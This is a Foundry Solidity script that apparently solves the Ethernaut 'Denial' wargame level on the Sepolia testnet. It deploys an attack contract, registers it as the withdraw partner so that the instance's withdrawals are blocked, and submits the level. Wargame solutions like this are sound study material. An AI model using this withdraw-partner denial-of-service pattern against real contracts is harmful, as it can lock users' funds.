// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Denial} from "../src/Level20.sol";
import {Attack} from "../src/Level20Attack.sol";

contract Level20 is Script {
    IEthernaut _ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address _caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Denial _instance = Denial(payable(vm.envAddress("LVL20_ADDR")));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack _attack = new Attack();
        _instance.setWithdrawPartner(address(_attack));

        _ethernaut.submitLevelInstance(address(_instance));
    }
}

// forge script script/Level20.s.sol --broadcast --rpc-url sepolia -vvvv
